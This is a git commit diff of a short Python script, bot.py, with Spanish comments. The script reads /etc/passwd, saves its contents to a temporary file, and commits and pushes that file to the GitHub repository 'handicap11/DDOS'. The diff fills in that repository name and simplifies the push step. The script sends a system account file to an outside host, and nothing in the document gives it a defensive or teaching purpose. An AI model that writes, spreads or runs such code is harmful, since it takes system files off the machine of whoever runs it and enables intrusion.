e01840b2c1cd55e02f21f014c633f6fbbf4e43fc
handicap11 <158589346+handicap11@users.noreply.github.com>
2024-02-09 15:57:46 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,5 +1,4 @@
 import subprocess
-import os
 
 def run():
     # Ruta al archivo /etc/passwd
@@ -9,13 +8,10 @@ def run():
     mensaje_commit = 'Agregar /etc/passwd a GitHub'
 
     # Nombre del repositorio en GitHub
-    repo_nombre = 'tu_usuario/tu_repositorio'
+    repo_nombre = 'handicap11/DDOS'
     
     # Nombre del archivo en el repositorio
     archivo_en_repo = 'passwd_backup.txt'
-
-    # Inicializar un nuevo repositorio git en el directorio actual
-    subprocess.run(['git', 'init'])
 
     # Lee el contenido del archivo /etc/passwd
     with open(ruta_passwd, 'r') as file:
@@ -24,19 +20,13 @@ def run():
     # Guarda el contenido en un archivo temporal
     with open('temp_passwd_backup.txt', 'w') as temp_file:
         temp_file.write(contenido)
-        
+
     # Añade y sube el archivo al repositorio de GitHub
+    subprocess.run(['git', 'init'])  # Inicializa un nuevo repositorio git en el directorio actual
     subprocess.run(['git', 'add', 'temp_passwd_backup.txt'])
     subprocess.run(['git', 'commit', '-m', mensaje_commit])
-
-    # Añadir el control remoto, reemplaza 'main' con el nombre correcto de la rama principal
     subprocess.run(['git', 'remote', 'add', 'origin', f'https://github.com/{repo_nombre}.git'])
-
-    # Obtener el nombre de la rama principal
-    branch_name = subprocess.check_output(['git', 'symbolic-ref', '--short', 'HEAD']).strip().decode('utf-8')
-
-    # Push al repositorio remoto
-    subprocess.run(['git', 'push', '-u', 'origin', branch_name])
+    subprocess.run(['git', 'push', '-u', 'origin', 'master'])  # Empuja al repositorio remoto, ajusta 'master' si es necesario
 
     print(f'Archivo {ruta_passwd} copiado a GitHub en el repositorio {repo_nombre}/{archivo_en_repo}')
 
